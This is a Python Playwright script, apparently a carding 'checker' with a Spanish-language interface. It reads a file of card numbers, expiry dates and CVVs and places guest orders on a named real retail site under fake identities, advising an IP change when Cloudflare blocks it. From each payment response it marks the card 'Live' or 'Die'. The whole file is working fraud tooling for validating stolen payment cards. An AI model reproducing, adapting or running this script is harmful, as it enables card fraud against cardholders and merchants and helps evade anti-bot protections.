import asyncio
import re
from playwright.async_api import Playwright, async_playwright, expect
import colorama
import json
import random
from faker import Faker

fake = Faker()

def generatePhoneNumber():
    return f"(508) {random.randint(100, 999)}-{random.randint(1000, 9999)}"


def getCards(file):
    cards = []
    with open(file, "r") as f:
        for line in f:
            cards.append(line.strip())
    cards_groups = [cards[i:i+3] for i in range(0, len(cards), 3)]
    return cards_groups


async def check_cloudflare(page):
    if "Just a moment" in await page.title() or "just a moment" in await page.title():
        return True
    return False

async def add_card(page, page_view, cc, mes, ano, cvv, email):
    card = cc + "|" + mes + "|" + ano + "|" + cvv

    await page.get_by_role("textbox", name="Card Number").click()
    await page.get_by_role("textbox", name="Card Number").fill(cc)
    await page.get_by_role("textbox", name="Exp Month").click()
    await page.get_by_role("textbox", name="Exp Month").fill(mes)
    await page.get_by_role("textbox", name="Exp Year").click()
    await page.get_by_role("textbox", name="Exp Year").fill(ano if len(ano) == 2 else ano[2:])
    await page.get_by_role("textbox", name="CVV").click()
    await page.get_by_role("textbox", name="CVV").fill(cvv)
    await page.get_by_role("textbox", name="Email Address").click()
    await page.get_by_role("textbox", name="Email Address").fill(email)
    await page.get_by_role("button", name="Continue").click()
    await expect(page.get_by_role("heading", name="Review")).to_be_visible()
    await page.get_by_role("button", name="Place Order").click()
    await page.wait_for_timeout(5000)

    if await page.locator("#billing_errors div").first.is_visible():
        if "Insufficient funds" in await page.locator("#billing_errors div").first.inner_text() or "insufficient funds" in await page.locator("#billing_errors div").first.inner_text():
            print(colorama.Fore.GREEN + f"Live - Insufficient funds - {card}" + colorama.Fore.RESET)      
        else:
            print(colorama.Fore.RED + f"Die - " + await page.locator("#billing_errors div").first.inner_text().replace("Errors", " ") + " - " + card + colorama.Fore.RESET)
    else:
        print(colorama.Fore.GREEN + f"Live - Compra exitosa - {card}" + colorama.Fore.RESET)

async def verificar_targeta(page, page_view, cc, mes, ano, cvv):
    for attempt in range(2):
        try:

            firstname = fake.first_name()
            lastname = fake.last_name()
            email = firstname.lower() + lastname.lower() + str(random.randint(100, 999)) + "@gmail.com"
            phone = generatePhoneNumber()

            if page_view == 'inicio':
                await page.goto("https://www.orientaltrading.com/16-oz--star-wars-the-mandalorian-baby-yoda-reusable-plastic-favor-tumbler-a2-13963115.fltr")
                page_view = 'add_to_cart'
                if await check_cloudflare(page):
                    print(colorama.Fore.YELLOW + "Cloudflare - espere un momento o cambie de ip" + colorama.Fore.RESET) 
                    page.wait_for_timeout(5000)
                    return
  
            if page_view == 'add_to_cart':
                await page.get_by_role("button", name="Add to Cart").click()
                await expect(page.get_by_text("ORDER Summary")).to_be_visible()
                await page.get_by_role("link", name="Proceed to Checkout").click()
                await page.get_by_role("link", name="Guest Check Out").click()
                page_view = 'fill_form'

            if page_view == 'fill_form':
                await page.get_by_role("textbox", name="First Name").click()
                await expect(page.get_by_role("textbox", name="First Name")).to_be_visible()
                await expect(page.get_by_role("textbox", name="Last Name")).to_be_visible()
                await expect(page.get_by_role("textbox", name="Address 1")).to_be_visible()
                await expect(page.get_by_role("textbox", name="Zip Code")).to_be_visible()
                await expect(page.get_by_role("textbox", name="Phone Number")).to_be_visible()
        
                await page.get_by_role("textbox", name="First Name").click()
                await page.get_by_role("textbox", name="First Name").fill(firstname)
                await page.get_by_role("textbox", name="Last Name").click()
                await page.get_by_role("textbox", name="Last Name").fill(lastname)
                await page.get_by_role("textbox", name="Address 1").click()
                await page.get_by_role("textbox", name="Address 1").fill("street 23")
                await page.get_by_role("textbox", name="Zip Code").click()
                await page.get_by_role("textbox", name="Zip Code").fill("10080")
                await page.get_by_role("textbox", name="Phone Number").click()
                await page.get_by_role("textbox", name="Phone Number").fill(phone)
                await page.get_by_role("button", name="Continue").click()
                page_view = 'card'

            if page_view == 'card':
                await add_card(page, page_view, cc, mes, ano, cvv, email)
            break
        except Exception as e:
            print(colorama.Fore.RED + f"Recheckeando {e} - Intento: {attempt + 1}/3" + colorama.Fore.RESET)



async def run(playwright: Playwright, card_group) -> None:
    browser = await playwright.chromium.launch(headless=False)
    context = await browser.new_context()
    page = await context.new_page()

    page_view = 'inicio'

    first = card_group[0].split("|")
    await verificar_targeta(page, page_view, first[0], first[1], first[2], first[3])
    for i in range(1, len(card_group)):
        card_actual = card_group[i].split("|")
        await verificar_targeta(page, 'card', card_actual[0], card_actual[1], card_actual[2], card_actual[3])
    print(colorama.Fore.RED + "Cerrando navegador" + colorama.Fore.RESET)
    # ---------------------
    await context.close()
    await browser.close()


async def process_card_groups(card_groups):
    for group in card_groups:
        async with async_playwright() as playwright:
            await run(playwright, group)
    
    print(colorama.Fore.GREEN + "Proceso finalizado" + colorama.Fore.RESET)

if __name__ == "__main__":

    print(colorama.Fore.BLUE + r"""
_________ .__                   __                 
\_   ___ \|  |__   ____   ____ |  | __ ___________ 
/    \  \/|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ \
\     \___|   Y  \  ___/\  \___|    <\  ___/|  | \/
 \______  /___|  /\___  >\___  >__|_ \\___  >__|   
        \/     \/     \/     \/     \/    \/       

    """ + colorama.Fore.RESET)

    while True:
        file_cards = input(colorama.Fore.RED + "Ingrese el nombre del archivo con las tarjetas (cards.txt): " + colorama.Fore.RESET)
        try:
            cards = getCards(file_cards)
            if(len(cards) == 0):
                print(colorama.Fore.RED + "El archivo esta vacio" + colorama.Fore.RESET)
                continue
            break
        except FileNotFoundError:
            print(colorama.Fore.RED + "El archivo no fue encontrado" + colorama.Fore.RESET)

    print(colorama.Fore.RED + "Procesando tarjetas" + colorama.Fore.RESET)
    asyncio.run(process_card_groups(cards))

